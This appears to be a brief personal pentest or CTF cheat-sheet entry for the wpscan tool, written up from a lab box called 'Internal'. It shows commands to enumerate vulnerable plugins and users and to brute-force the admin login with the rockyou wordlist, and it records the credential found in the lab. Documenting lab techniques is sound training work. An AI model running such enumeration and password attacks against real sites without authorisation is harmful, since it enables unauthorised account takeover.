# wpscan

WordPress scanner for version detection, user enumeration, vulnerable plugin/theme checks, and password attacks against WordPress login surfaces.

## Commands Used

### Enumerate vulnerable plugins and users

```bash
wpscan --url http://internal.thm/blog -e vp,u
```

Used on: **Internal** - confirmed WordPress context and user enumeration surface.

### Brute-force a known user

```bash
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

Used on: **Internal** - found `admin:my2boys`.

## Related

- [../../exploits/web-rce/wordpress-theme-editor-webshell.md](../../exploits/web-rce/wordpress-theme-editor-webshell.md)


